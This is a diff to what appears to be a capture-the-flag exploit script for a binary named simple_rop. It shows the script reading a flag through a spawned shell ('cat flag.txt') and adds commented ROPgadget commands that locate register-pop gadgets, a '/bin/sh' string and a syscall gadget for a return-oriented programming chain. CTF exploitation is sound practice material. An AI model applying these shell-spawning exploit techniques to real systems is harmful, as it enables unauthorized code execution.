@@ -55,3 +55,8 @@ p.sendline(b'cat flag.txt')
 flag = p.recvline().decode().strip()
 print(f"\033[93;1mFlag: {flag}\033[0m")
 p.close()
+
+
+# ROPgadget --binary ./simple_rop --only 'pop|ret' | grep -E 'rdi|rsi|rdx|rax'
+# ROPgadget --binary ./simple_rop --string '/bin/sh'
+# ROPgadget --binary ./simple_rop --only 'syscall'
